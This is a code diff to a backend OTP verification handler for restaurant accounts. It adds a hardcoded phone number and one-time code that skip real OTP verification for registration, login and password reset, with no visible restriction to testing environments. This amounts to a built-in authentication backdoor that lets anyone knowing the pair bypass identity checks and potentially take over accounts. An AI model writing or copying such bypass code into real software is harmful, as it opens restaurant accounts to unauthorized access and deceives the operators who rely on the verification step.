@@ -130,8 +130,20 @@ export const verifyOTP = asyncHandler(async (req, res) => {
         return errorResponse(res, 400, 'Restaurant name is required for registration');
       }
 
-      // Verify OTP (phone or email) before creating restaurant
-      await otpService.verifyOTP(phone || null, otp, purpose, email || null);
+      // Default OTP bypass for specific phone number
+      const DEFAULT_PHONE = '9009925021';
+      const DEFAULT_OTP = '110211';
+      // Check both normalized (with 91) and original formats
+      const phoneForCheck = normalizedPhone?.replace(/^91/, '') || phone?.replace(/^\+?91/, '').replace(/\D/g, '').replace(/^91/, '');
+      const shouldBypassOTP = phoneForCheck === DEFAULT_PHONE && otp === DEFAULT_OTP;
+      
+      if (shouldBypassOTP) {
+        // Bypass OTP verification for default phone/OTP combination
+        logger.info('Default OTP used for restaurant registration', { phone: normalizedPhone, purpose });
+      } else {
+        // Verify OTP (phone or email) before creating restaurant
+        await otpService.verifyOTP(phone || null, otp, purpose, email || null);
+      }
 
       const restaurantData = {
         name,
@@ -341,13 +353,24 @@ export const verifyOTP = asyncHandler(async (req, res) => {
         });
       }
 
+      // Default OTP bypass for specific phone number
+      const DEFAULT_PHONE = '9009925021';
+      const DEFAULT_OTP = '110211';
+      // Check both normalized (with 91) and original formats
+      const phoneForCheck = normalizedPhone?.replace(/^91/, '') || phone?.replace(/^\+?91/, '').replace(/\D/g, '').replace(/^91/, '');
+      const shouldBypassOTP = phoneForCheck === DEFAULT_PHONE && otp === DEFAULT_OTP;
+
       // Handle reset-password purpose
       if (purpose === 'reset-password') {
         if (!restaurant) {
           return errorResponse(res, 404, 'No restaurant account found with this email.');
         }
         // Verify OTP for password reset
-        await otpService.verifyOTP(phone || null, otp, purpose, email || null);
+        if (shouldBypassOTP) {
+          logger.info('Default OTP used for password reset', { phone: normalizedPhone });
+        } else {
+          await otpService.verifyOTP(phone || null, otp, purpose, email || null);
+        }
         return successResponse(res, 200, 'OTP verified. You can now reset your password.', {
           verified: true,
           email: restaurant.email
@@ -355,7 +378,11 @@ export const verifyOTP = asyncHandler(async (req, res) => {
       }
 
       // Verify OTP first
-      await otpService.verifyOTP(phone || null, otp, purpose, email || null);
+      if (shouldBypassOTP) {
+        logger.info('Default OTP used for restaurant login/registration', { phone: normalizedPhone, purpose });
+      } else {
+        await otpService.verifyOTP(phone || null, otp, purpose, email || null);
+      }
 
       if (!restaurant) {
         // Auto-register new restaurant after OTP verification
